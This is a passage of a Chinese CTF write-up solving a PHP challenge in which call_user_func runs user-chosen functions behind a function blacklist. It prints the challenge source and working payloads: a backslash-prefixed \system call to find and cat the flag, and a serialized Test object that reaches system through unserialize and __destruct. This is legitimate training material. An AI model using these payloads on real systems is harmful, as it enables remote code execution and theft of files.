alt="image"><br>回显了hacker。。估计是太直白了，system&#x2F;eval都会回显Hacker。include&#x2F;require函数读下index.php的源码？<br><code>func=include&amp;p=php://filter/read=convert.base64-encode/resource=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904100428721-1887388885.png" alt="image"><br>提示call_user_func()函数找不到第一个参数include&#x2F;require或这是一个无效的函数名？怎么会找不到include()函数呢？问了下GPT发现call_back_func不是所有函数都能执行，它是<strong>调用一个回调函数或方法</strong>。而且并不是所有函数都是回调函数，判断一个函数能否回调可以用<code>is_callable</code>函数，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;可以回调&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不可回调&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//结果：不可回调</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不得不说CHATGPT这东西确实好用，我问他call_back_func(include,php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php)为什么不行时他不光给了不可用的理由，还建议我用file_get_contents()函数去读文件：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102026887-1995512140.png" alt="image"><br>差点把这东西忘了，既然它可以回调就file_get_contents(index.php)读下Index.php：<br><code>func=file_get_contents&amp;p=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102245157-1804309849.png" alt="image"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<span class="hljs-comment">//黑名单，禁用了很多函数</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>       <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>); <span class="hljs-comment">//调用call_user_func函数，注意该函数只能调用可以回调的函数</span><br>       <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>); <span class="hljs-comment">//$result是什么类型？</span><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123; <span class="hljs-comment">//如果是字符串</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125; <span class="hljs-comment">//如果是其它</span><br>   &#125;<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<span class="hljs-comment">//旧式的用于声明类属性（成员变量）的关键字，新版本的PHP多用 public等</span><br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>       <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>           &#125;<br>       &#125;<br>   &#125;<br>   <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<span class="hljs-comment">//获取通过 GET、POST 和 COOKIE 方法传递的参数</span><br>   <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>       <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>       &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>       &#125;<br>   &#125;<br>   <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>尝试用相对路径读有没有flag.php这东西。。没试出来。。就去网上找了下wp。感觉已经很接近结果了有点不甘心😔感谢这位师傅的文章：<br><code>https://blog.csdn.net/qq_58784379/article/details/120877859</code><br>第一种方法：<br>在PHP中的函数前面加个\并不印象函数运行(php内的” \ “在做代码执行的时候，会识别特殊字符串，绕过黑名单)。拿前面那个is_callable函数举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (\<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;可以回调&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不可回调&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//结果仍是不可回调</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>问了下GPT，这个\是一种命名空间限定符，用于告诉 PHP 解释器要使用全局命名空间中的函数，而不是当前命名空间中的函数。如果没有使用命名空间或没有同名函数存在于全局命名空间中，添加反斜杠将没有实际影响。<br><code>func=\system&amp;p=find / -name &quot;flag*&quot;//跟以前做的题一样，只要用find找东西就是全磁盘查找，会很慢</code><br>回显：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110040442-185642157.png" alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110103088-327207158.png" alt="image"><br>读最底下这个<code>/tmp/flagoefiu4r93</code>：<br><code>func=file_get_contents&amp;p=/tmp/flagoefiu4r93</code><br>或者<code>func=\system&amp;p=cat /tmp/flagoefiu4r93</code><br>得flag<br>第二种方法用了反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p); <span class="hljs-comment">//命令执行</span><br>            &#125;<br>        &#125;<br><span class="hljs-comment">//这东西没被用过，因为Test类里包含一个__destruct函数，这函数在对象被销毁时会被调用，</span><br></code></pre></td></tr></table></figure><p>我们想执行system(‘ls’)而且要绕过对func的黑名单检测，可以先序列化要执行的命令，然后利用get函数反序列化要执行的命令，反序列化后要销毁变量时会调用__destruct函数，这个函数定义了func(要执行的命令)和p(要执行命令的参数)，然后再调用一次gettime函数(又执行了一次命令)。一来一回执行了两次gettime。<br>先序列化我们要执行的命令和参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;<br>       <br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//结果：O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>payload:<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;// 看当前目录下有什么文件</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121505457-2065669123.png" alt="image"><br>OK，没啥问题，因为根据第一种做法已经知道了flag藏在哪，直接去找<code>/tmp/flagoefiu4r93</code>把我们的命令序列化一下：<br><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code><br>结果：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904121727159-1447658532.png" alt="image"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
